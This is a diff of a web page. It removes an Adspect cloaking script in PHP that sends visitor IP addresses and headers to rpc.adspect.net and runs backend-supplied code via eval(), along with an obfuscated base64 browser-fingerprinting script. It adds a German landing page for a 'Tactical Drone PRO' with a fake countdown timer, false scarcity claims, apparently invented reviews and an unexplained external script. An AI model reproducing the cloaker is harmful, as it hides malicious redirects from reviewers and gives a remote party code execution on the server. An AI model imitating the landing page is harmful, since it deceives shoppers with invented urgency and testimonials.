@@ -1,13 +1,281 @@
-<?php
- ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('e1c9eac2-e91e-4e25-80a5-9daf8a749b04', 'redirect', '_', base64_decode('a/xOC9u6Kqnv4x0LpUuTGtd8mekGOML2J1hKPFwaNPw=')); if (!isset($target)) { return; } ?>
 <!DOCTYPE html>
 <html>
-<head>
-	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
-	<meta name="referrer" content="no-referrer">
-</head>
-<body>
-	<script src="data:text/javascript;base64,dmFyIF8weDExNzQ9WydjcmVhdGVFbGVtZW50JywnMTA3MTI4eHRXV3JsJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ3B1c2gnLCdnZXRQYXJhbWV0ZXInLCdpbnB1dCcsJzE1MjQ1dHJiclpFJywnMzd6RmR1Z2cnLCdsb2NhdGlvbicsJ21ldGhvZCcsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnZ2V0Q29udGV4dCcsJ2xlbmd0aCcsJ25hdmlnYXRvcicsJ3Rvc3RyaW5nJywnZ2V0RXh0ZW5zaW9uJywnZ2V0T3duUHJvcGVydHlOYW1lcycsJzI3ODYwNnZzRVVsaScsJ2Vycm9ycycsJzYzNjJNcVZaYmcnLCdoaWRkZW4nLCdub3RpZmljYXRpb25zJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywnbWVzc2FnZScsJzIxQUNCcVNyJywnMW5xRWFTcicsJ3RvdWNoRXZlbnQnLCcxNjk3S29VQ3FNJywnYWN0aW9uJywndGltZXpvbmVPZmZzZXQnLCdOb3RpZmljYXRpb24nLCdkYXRhJywnYXR0cmlidXRlcycsJzNPUmFmdVcnLCdQT1NUJywncXVlcnknLCd2YWx1ZScsJ29iamVjdCcsJ3N0cmluZ2lmeScsJ3RvU3RyaW5nJywnMzc2NTl6VlhYSGgnLCcxNTVMTGpZRncnLCdwZXJtaXNzaW9ucycsJ2FwcGVuZENoaWxkJywnd2ViZ2wnLCdnZXRUaW1lem9uZU9mZnNldCcsJzQ3MDY4MUxuRWNXRycsJ3N0YXRlJywnVG91Y2hFdmVudCddO3ZhciBfMHgxYTU1PWZ1bmN0aW9uKF8weDJkZTg4MCxfMHg0NTQxNjcpe18weDJkZTg4MD1fMHgyZGU4ODAtMHgxNjg7dmFyIF8weDExNzQ5MD1fMHgxMTc0W18weDJkZTg4MF07cmV0dXJuIF8weDExNzQ5MDt9OyhmdW5jdGlvbihfMHgzZTdjMWUsXzB4M2QzYTE5KXt2YXIgXzB4NTJkMTY0PV8weDFhNTU7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHg1NzI5ZmM9LXBhcnNlSW50KF8weDUyZDE2NCgweDE2YSkpKy1wYXJzZUludChfMHg1MmQxNjQoMHgxN2MpKSpwYXJzZUludChfMHg1MmQxNjQoMHgxNzApKSstcGFyc2VJbnQoXzB4NTJkMTY0KDB4MTdhKSkqLXBhcnNlSW50KF8weDUyZDE2NCgweDE4MikpKy1wYXJzZUludChfMHg1MmQxNjQoMHgxOTIpKSotcGFyc2VJbnQoXzB4NTJkMTY0KDB4MTg0KSkrcGFyc2VJbnQoXzB4NTJkMTY0KDB4MThhKSkqcGFyc2VJbnQoXzB4NTJkMTY0KDB4MTkxKSkrLXBhcnNlSW50KF8weDUyZDE2NCgweDE4MSkpKi1wYXJzZUludChfMHg1MmQxNjQoMHgxNmYpKSstcGFyc2VJbnQoXzB4NTJkMTY0KDB4MTk3KSk7aWYoXzB4NTcyOWZjPT09XzB4M2QzYTE5KWJyZWFrO2Vsc2UgXzB4M2U3YzFlWydwdXNoJ10oXzB4M2U3YzFlWydzaGlmdCddKCkpO31jYXRjaChfMHgyMDQ5YTApe18weDNlN2MxZVsncHVzaCddKF8weDNlN2MxZVsnc2hpZnQnXSgpKTt9fX0oXzB4MTE3NCwweDI3NzE4KSxmdW5jdGlvbigpe3ZhciBfMHgxNGQ0NzE9XzB4MWE1NTtmdW5jdGlvbiBfMHg1NmViMTUoKXt2YXIgXzB4NDFjYTMwPV8weDFhNTU7XzB4YmRmOGM5W18weDQxY2EzMCgweDE3YildPV8weDJkZjg3Mzt2YXIgXzB4MjZiYzg4PWRvY3VtZW50W18weDQxY2EzMCgweDE2OSldKCdmb3JtJyksXzB4NDBkNDZhPWRvY3VtZW50W18weDQxY2EzMCgweDE2OSldKF8weDQxY2EzMCgweDE2ZSkpO18weDI2YmM4OFtfMHg0MWNhMzAoMHgxNzIpXT1fMHg0MWNhMzAoMHgxOGIpLF8weDI2YmM4OFtfMHg0MWNhMzAoMHgxODUpXT13aW5kb3dbXzB4NDFjYTMwKDB4MTcxKV1bJ2hyZWYnXSxfMHg0MGQ0NmFbJ3R5cGUnXT1fMHg0MWNhMzAoMHgxN2QpLF8weDQwZDQ2YVsnbmFtZSddPV8weDQxY2EzMCgweDE4OCksXzB4NDBkNDZhW18weDQxY2EzMCgweDE4ZCldPUpTT05bXzB4NDFjYTMwKDB4MThmKV0oXzB4YmRmOGM5KSxfMHgyNmJjODhbJ2FwcGVuZENoaWxkJ10oXzB4NDBkNDZhKSxkb2N1bWVudFsnYm9keSddW18weDQxY2EzMCgweDE5NCldKF8weDI2YmM4OCksXzB4MjZiYzg4WydzdWJtaXQnXSgpO312YXIgXzB4MmRmODczPVtdLF8weGJkZjhjOT17fTt0cnl7dmFyIF8weDU5MGFlZj1mdW5jdGlvbihfMHgxMzZhZmMpe3ZhciBfMHg4ZWNkYWU9XzB4MWE1NTtpZihfMHg4ZWNkYWUoMHgxOGUpPT09dHlwZW9mIF8weDEzNmFmYyYmbnVsbCE9PV8weDEzNmFmYyl7dmFyIF8weDU3NDliOT1mdW5jdGlvbihfMHg0N2FkOWMpe3ZhciBfMHgyOTgxYzc9XzB4OGVjZGFlO3RyeXt2YXIgXzB4MTY5YTcwPV8weDEzNmFmY1tfMHg0N2FkOWNdO3N3aXRjaCh0eXBlb2YgXzB4MTY5YTcwKXtjYXNlJ29iamVjdCc6aWYobnVsbD09PV8weDE2OWE3MClicmVhaztjYXNlJ2Z1bmN0aW9uJzpfMHgxNjlhNzA9XzB4MTY5YTcwW18weDI5ODFjNygweDE5MCldKCk7fV8weGFhYzA4OVtfMHg0N2FkOWNdPV8weDE2OWE3MDt9Y2F0Y2goXzB4NGM3MTVjKXtfMHgyZGY4NzNbXzB4Mjk4MWM3KDB4MTZjKV0oXzB4NGM3MTVjW18weDI5ODFjNygweDE4MCldKTt9fSxfMHhhYWMwODk9e30sXzB4NDUzYzAwO2ZvcihfMHg0NTNjMDAgaW4gXzB4MTM2YWZjKV8weDU3NDliOShfMHg0NTNjMDApO3RyeXt2YXIgXzB4NTI2M2NiPU9iamVjdFtfMHg4ZWNkYWUoMHgxNzkpXShfMHgxMzZhZmMpO2ZvcihfMHg0NTNjMDA9MHgwO18weDQ1M2MwMDxfMHg1MjYzY2JbXzB4OGVjZGFlKDB4MTc1KV07KytfMHg0NTNjMDApXzB4NTc0OWI5KF8weDUyNjNjYltfMHg0NTNjMDBdKTtfMHhhYWMwODlbJyEhJ109XzB4NTI2M2NiO31jYXRjaChfMHgyOGQ4MTkpe18weDJkZjg3M1tfMHg4ZWNkYWUoMHgxNmMpXShfMHgyOGQ4MTlbXzB4OGVjZGFlKDB4MTgwKV0pO31yZXR1cm4gXzB4YWFjMDg5O319O18weGJkZjhjOVsnc2NyZWVuJ109XzB4NTkwYWVmKHdpbmRvd1snc2NyZWVuJ10pLF8weGJkZjhjOVsnd2luZG93J109XzB4NTkwYWVmKHdpbmRvdyksXzB4YmRmOGM5W18weDE0ZDQ3MSgweDE3NildPV8weDU5MGFlZih3aW5kb3dbJ25hdmlnYXRvciddKSxfMHhiZGY4YzlbXzB4MTRkNDcxKDB4MTcxKV09XzB4NTkwYWVmKHdpbmRvd1snbG9jYXRpb24nXSksXzB4YmRmOGM5Wydjb25zb2xlJ109XzB4NTkwYWVmKHdpbmRvd1snY29uc29sZSddKSxfMHhiZGY4YzlbJ2RvY3VtZW50RWxlbWVudCddPWZ1bmN0aW9uKF8weDNmZDg5OCl7dmFyIF8weDI1YzE1Yj1fMHgxNGQ0NzE7dHJ5e3ZhciBfMHgzNTEwOWM9e307XzB4M2ZkODk4PV8weDNmZDg5OFtfMHgyNWMxNWIoMHgxODkpXTtmb3IodmFyIF8weDU4YmJkYSBpbiBfMHgzZmQ4OTgpXzB4NThiYmRhPV8weDNmZDg5OFtfMHg1OGJiZGFdLF8weDM1MTA5Y1tfMHg1OGJiZGFbJ25vZGVOYW1lJ11dPV8weDU4YmJkYVsnbm9kZVZhbHVlJ107cmV0dXJuIF8weDM1MTA5Yzt9Y2F0Y2goXzB4MTE0NGU4KXtfMHgyZGY4NzNbXzB4MjVjMTViKDB4MTZjKV0oXzB4MTE0NGU4W18weDI1YzE1YigweDE4MCldKTt9fShkb2N1bWVudFsnZG9jdW1lbnRFbGVtZW50J10pLF8weGJkZjhjOVsnZG9jdW1lbnQnXT1fMHg1OTBhZWYoZG9jdW1lbnQpO3RyeXtfMHhiZGY4YzlbXzB4MTRkNDcxKDB4MTg2KV09bmV3IERhdGUoKVtfMHgxNGQ0NzEoMHgxOTYpXSgpO31jYXRjaChfMHgzYmY2ZWUpe18weDJkZjg3M1tfMHgxNGQ0NzEoMHgxNmMpXShfMHgzYmY2ZWVbJ21lc3NhZ2UnXSk7fXRyeXtfMHhiZGY4YzlbJ2Nsb3N1cmUnXT1mdW5jdGlvbigpe31bXzB4MTRkNDcxKDB4MTkwKV0oKTt9Y2F0Y2goXzB4NThiYzEwKXtfMHgyZGY4NzNbXzB4MTRkNDcxKDB4MTZjKV0oXzB4NThiYzEwW18weDE0ZDQ3MSgweDE4MCldKTt9dHJ5e18weGJkZjhjOVtfMHgxNGQ0NzEoMHgxODMpXT1kb2N1bWVudFsnY3JlYXRlRXZlbnQnXShfMHgxNGQ0NzEoMHgxNjgpKVtfMHgxNGQ0NzEoMHgxOTApXSgpO31jYXRjaChfMHg0NzJiZDQpe18weDJkZjg3M1tfMHgxNGQ0NzEoMHgxNmMpXShfMHg0NzJiZDRbXzB4MTRkNDcxKDB4MTgwKV0pO310cnl7XzB4NTkwYWVmPWZ1bmN0aW9uKCl7fTt2YXIgXzB4Mjg4ZDQ0PTB4MDtfMHg1OTBhZWZbXzB4MTRkNDcxKDB4MTkwKV09ZnVuY3Rpb24oKXtyZXR1cm4rK18weDI4OGQ0NCwnJzt9LGNvbnNvbGVbJ2xvZyddKF8weDU5MGFlZiksXzB4YmRmOGM5W18weDE0ZDQ3MSgweDE3NyldPV8weDI4OGQ0NDt9Y2F0Y2goXzB4NDkxMmJhKXtfMHgyZGY4NzNbJ3B1c2gnXShfMHg0OTEyYmFbXzB4MTRkNDcxKDB4MTgwKV0pO313aW5kb3dbXzB4MTRkNDcxKDB4MTc2KV1bXzB4MTRkNDcxKDB4MTkzKV1bXzB4MTRkNDcxKDB4MThjKV0oeyduYW1lJzpfMHgxNGQ0NzEoMHgxN2UpfSlbJ3RoZW4nXShmdW5jdGlvbihfMHg0YTE5NWYpe3ZhciBfMHgzZWFjNjM9XzB4MTRkNDcxO18weGJkZjhjOVsncGVybWlzc2lvbnMnXT1bd2luZG93W18weDNlYWM2MygweDE4NyldWydwZXJtaXNzaW9uJ10sXzB4NGExOTVmW18weDNlYWM2MygweDE5OCldXSxfMHg1NmViMTUoKTt9LF8weDU2ZWIxNSk7dHJ5e3ZhciBfMHgzYzhlYzI9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXSgnY2FudmFzJylbXzB4MTRkNDcxKDB4MTc0KV0oJ3dlYmdsJyksXzB4MmRhMjZhPV8weDNjOGVjMltfMHgxNGQ0NzEoMHgxNzgpXShfMHgxNGQ0NzEoMHgxNmIpKTtfMHhiZGY4YzlbXzB4MTRkNDcxKDB4MTk1KV09eyd2ZW5kb3InOl8weDNjOGVjMltfMHgxNGQ0NzEoMHgxNmQpXShfMHgyZGEyNmFbXzB4MTRkNDcxKDB4MTdmKV0pLCdyZW5kZXJlcic6XzB4M2M4ZWMyW18weDE0ZDQ3MSgweDE2ZCldKF8weDJkYTI2YVtfMHgxNGQ0NzEoMHgxNzMpXSl9O31jYXRjaChfMHgxZDVkNTQpe18weDJkZjg3M1tfMHgxNGQ0NzEoMHgxNmMpXShfMHgxZDVkNTRbXzB4MTRkNDcxKDB4MTgwKV0pO319Y2F0Y2goXzB4NGYzZWRjKXtfMHgyZGY4NzNbXzB4MTRkNDcxKDB4MTZjKV0oXzB4NGYzZWRjW18weDE0ZDQ3MSgweDE4MCldKSxfMHg1NmViMTUoKTt9fSgpKTs="></script>
-</body>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=480">
+		<title>Tactical Drone PRO</title>
+		<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+		<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700" rel="stylesheet">
+		<link rel="stylesheet" href="css/normalize.css">
+		<link rel="stylesheet" href="css/main.css">
+	<script type="text/javascript" src="script_land.js" defer></script>
+		 <script type="text/javascript" src="16vo3kqdcxw9.js"></script> 
+		
+		/head>
+	<body>
+		<div class="wrapper">
+			<div class="forma">
+				<div class="top">
+					<div class="title"><span class="titlespan">Tactical Drone</span> <span class="titlespan2">PRO</span></div>
+					<div class="description">
+						<div class="left">Eine echte Entdeckung auf dem modernen Drohnenmarkt</div>
+					</div>
+					<div class="features">
+						<div class="left">
+							<div class="l1">
+								<img src="img/check.png">
+								<p>Perfekte Stabilisierung auch bei starkem Wind</p>
+							</div>
+							<div class="l2">
+								<img src="img/check.png">
+								<p>Konstruktion sturz- und stoßfest</p>
+							</div>
+							<div class="l3">
+								<img src="img/check.png">
+								<p>Makellose Geschwindigkeit und Kontrolle</p>
+							</div>
+						</div>
+						<div class="right">
+							<img src="img/sale.png" alt="">
+							<div class="text">
+								<div class="t2">50%</div>
+								<div class="t3">Rabatt</div>
+							</div>
+						</div>
+					</div>
+					<img src="img/drone.png" alt="">
+				</div>
+				<div class="timer">
+					<p>Bis zum Ende des Angebots bleibt:</p>
+					<div class="clockdiv" id="clockdiv">
+						<div>
+							<span class="hours"></span>
+						</div>
+						<div class="mins">
+							<span class="minutes"></span>
+						</div>
+						<div>
+							<span class="seconds"></span>
+						</div>
+					</div>
+				</div>
+				<div class="price">
+					<div class="old">
+						<p>Gemeinsamer Preis</p>
+						<span class="al-cost-promo">€</span>
+					</div>
+					<div class="new">
+						<p>Preis heute</p>
+						<span class="al-cost">€</span>
+					</div>
+				</div>
+				<a href="#form" class="btn">BESTELLUNG MIT RABATT</a>
+				<div class="leftprod">
+					<span><b class="js-countdown">14</b> Drohnen</span> blieben verfügbar
+					<img src="img/arrow.png" alt="">
+				</div>
+			</div>
+			<div class="block2">
+				<h2>HOCHWERTIGE KAMERA MIT NACHTTYP</h2>
+				<img src="img/gif_01.gif" class="gif">
+				<p>Tactical Drone PRO wurde von vielen professionellen Piloten anerkannt. Es hat zweifellos seine Ähnlichkeiten in jeder Hinsicht übertroffen und ist bereit, den Eigentümer einzuladen, Tag und Nacht das Vergnügen einer hochwertigen Luftaufnahme zu erleben. Und das alles zu einem sehr vernünftigen Preis im Gegensatz zu Analoga.</p>
+				<img src="img/p1.jpg" alt="">
+				<p>Mit Tactical Drone PRO können Sie unabhängig von Zeit und Wetter überall fantastische Fotos und Videos aufnehmen. Dank der Hochgeschwindigkeitsmotoren sowie dem einwandfreien Handling und dem starken Windwiderstand.</p>
+				<img src="img/p2.jpg" alt="">
+			</div>
+			<div class="block3">
+				<div class="item">
+					<div class="item1">
+						<b>Motoren</b>
+						<p>Enthält bürstenlose KV1000-Motoren. In der Praxis haben sie sich als ausschließlich auf der besten Seite erwiesen.</p>
+					</div>
+					<div class="item2" style="background-image: url('img/f1.jpg')"></div>
+				</div>
+				<div class="item">
+					<div class="item1">
+						<b>Kamera</b>
+						<p>FPV-Kamera FPV-Kamera 12MP / 1920 * 1080 / 30FPS mit variablem Neigungswinkel. Bildstabilisierung und Nachtmodus.
+						</p>
+					</div>
+					<div class="item2" style="background-image: url('img/f2.jpg')"></div>
+				</div>
+				<div class="item">
+					<div class="item1">
+						<b>Aufladen</b>
+						<p>Lithium-Polymer-Batterie 2200mAh 25C mit XT60-Stecker. Ermöglicht eine maximale Flugzeit von 30 Minuten.
+						</p>
+					</div>
+					<div class="item2" style="background-image: url('img/f3.jpg')"></div>
+				</div>
+				<div class="item">
+					<div class="item1">
+						<b>Handhabung</b>
+						<p>Steuerung mit professioneller 7-Kanal-Ausrüstung, die von jedem Anfänger problemlos bedient werden kann.
+						</p>
+					</div>
+					<div class="item2" style="background-image: url('img/f4.jpg')"></div>
+				</div>
+				<div class="leftprod">
+					<span><b class="js-countdown">14</b> Drohnen</span> blieben verfügbar
+				</div>
+				<a href="#form" class="btn">BESTELLUNG MIT RABATT</a>
+			</div>
+			<div class="block4">
+				<h2>BESONDERE FUNKTIONEN UND FLUGARTEN</h2>
+				<img src="img/p3.jpg" alt="">
+				<p><b>Funktion "Flug zu bestimmten Punkten"</b>
+					Durch Berühren des Senderbildschirms passt der Pilot die Koordinaten und die Höhe des Fluges und des Ziels an. Der Pilot nimmt nur an der Aufnahme von Fotos / Videos teil
+				</p>
+				<img src="img/gif_02.gif" alt="">
+				<p><b>Funktion "Panorama aufnehmen"</b>
+					Unterstützt den Panoramabetrieb mit einem horizontalen und vertikalen Betrachtungswinkel von 180 Grad.
+				</p>
+				<img src="img/p4.jpg" alt="">
+				<p><b>Halten Sie die Höhenfunktion gedrückt</b>
+					Höhenbuchungsfunktion. Das integrierte GPS-Modul ermöglicht es der Drohne, die vom Bediener festgelegte Position genau zu halten
+				</p>
+				<img src="img/gif_03.gif" alt="">
+			</div>
+			<div class="block5">
+				<h2>AUSRÜSTUNG UND FUNKTIONEN</h2>
+				<img src="img/p5.jpg" alt="">
+				<div class="about">
+					<div class="item">
+						<span>Modell:</span>
+						<span>Taktical PRO</span>
+					</div>
+					<div class="item">
+						<span>Fluggeschwindigkeit:</span>
+						<span>36 km/h</span>
+					</div>
+					<div class="item">
+						<span>Max. Entfernung FPV-Bereich:</span>
+						<span>1 km</span>
+					</div>
+					<div class="item">
+						<span>Maximale Flugzeit:</span>
+						<span>30 Minuten</span>
+					</div>
+					<div class="item">
+						<span>Kamera:</span>
+						<span>1920*1080 30FPS, FOV 90</span>
+					</div>
+					<div class="item">
+						<span>Motoren:</span>
+						<span>Bürstenloser KV1000</span>
+					</div>
+					<div class="item">
+						<span>Gewicht:</span>
+						<span>300 Gramm</span>
+					</div>
+					<div class="item">
+						<span>Maße:</span>
+						<span>500x300x200mm</span>
+					</div>
+				</div>
+				<div class="pack">
+					<img src="img/pack.jpg" alt="">
+					<div class="text">Lieferinhalt:</div>
+				</div>
+				<div class="pack-items">
+					<div class="item">Drohne х1</div>
+					<div class="item">Batterie x2</div>
+					<div class="item">Koffer</div>
+					<div class="item">Anleitung</div>
+					<div class="item">Set extra Ersatzpropeller</div>
+					<div class="item">Ladegerät</div>
+				</div>
+			</div>
+			<div class="block6">
+				<h2>KUNDENBEWERTUNGEN</h2>
+				<div class="slider">
+					<div class="slider-item">
+						<div class="name">
+							<img src="img/ava1.jpg" alt="">
+							<div>Wilhelm</div>
+						</div>
+						<img src="img/rev1.jpg" class="rev">
+						<p>Ich bin ein professioneller Fotograf und auch ein professioneller Drohnenpilot. Ich halte die Tactical Drone PRO für eines der besten Manöver ihrer Art. Es zeichnet mit hoher Qualität auf, es gibt kein Verwackeln beim Betrachten von Aufnahmen. Nachtfotografie ist mir sehr wichtig, da sie Teil meines Jobs ist. Und Tactical Drone PRO nimmt diese Aufgabe erfolgreich an!</p>
+					</div>
+				</div>
